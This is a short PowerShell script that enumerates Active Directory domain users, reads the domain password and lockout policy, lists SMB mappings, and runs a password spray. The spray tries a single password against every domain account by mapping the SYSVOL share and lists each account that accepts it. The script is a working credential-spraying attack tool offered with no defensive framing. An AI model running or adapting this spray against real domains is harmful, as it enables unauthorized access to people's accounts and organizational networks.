

Function Get-DomainUsers(){
$output = net user /domain;$output = $output[6..($output.length-3)];$output = $output -split "\s+" ;$output = $output | ? {$_}
$UserNames = $output
$UserNames
}


Function Get-DomainPasswordPolicy(){
$output = net accounts /domain;$output = $output[2..($output.length-3)]
$ouput

$props = @{
ForceUserLogOff = (($output -split '[\r\n]')[0].split(':')[1]).trim()
MinPwAge = (($output -split '[\r\n]')[1].split(':')[1]).trim()
MaxPwAge = (($output -split '[\r\n]')[2].split(':')[1]).trim()
MinPwLength = (($output -split '[\r\n]')[3].split(':')[1]).trim()
PwHistory  = (($output -split '[\r\n]')[4].split(':')[1]).trim()
LOThreshold = (($output -split '[\r\n]')[5].split(':')[1]).trim()
LODuration = (($output -split '[\r\n]')[6].split(':')[1]).trim()
LOWindow = (($output -split '[\r\n]')[7].split(':')[1]).trim()
CompRole = (($output -split '[\r\n]')[8].split(':')[1]).trim()
}

return New-Object PSObject -property $props

}

Function Get-SMBConnections(){
$output = net use ;$output = $output[6..($output.length-3)]
$output = ($output -split '[\r\n]') |? {$_}  
$array = @()
foreach($line in $output){
$object = [PSCustomOBject]@{
'Status' = ($line -split '\s\s+')[0]
'DriveLetter' = ($line -split '\s\s+')[1]
'UNCPath' = ($line -split '\s\s+')[2]
'Type' = ($line -split '\s\s+')[3]
}
$array += $object 
}
$array
}


Function Invoke-PasswordSpray(){

[CmdletBinding()]
Param(
[Parameter(Mandatory=$True)]
[string]$Password,
[parameter(Mandatory=$True)]
[string]$DriveLetter
)
Function DriveCheck(){$output = Get-WMIObject -query 'Select * From Win32_LogicalDisk Where DriveType = 4' | Select-Object DeviceID, ProviderName|where {$_.DeviceID -eq $DriveLetter};$output}
if (Drivecheck -eq !Null){(New-Object -ComObject WScript.Network).RemoveNetworkDrive($DriveLetter, 1)}
$usernames = get-domainusers
$UNCPath = '\\' + (Get-WmiObject Win32_ComputerSystem).Domain + '\sysvol'
write-host Testing Passwords to $UNCPath
$array01 = @()
foreach($name in $usernames){
$name = $name + '@' + (Get-WmiObject Win32_ComputerSystem).Domain
$net = new-object -ComObject WScript.Network
try{
$net.MapNetworkDrive($DriveLetter, $UNCPath, $false, $name, $password)
}
catch {Continue}
$var = $name + ' Is using Password ' + $Password
$array01 += $var
if (Drivecheck -eq !Null){(New-Object -ComObject WScript.Network).RemoveNetworkDrive($DriveLetter, 1)}

}
$array01
}
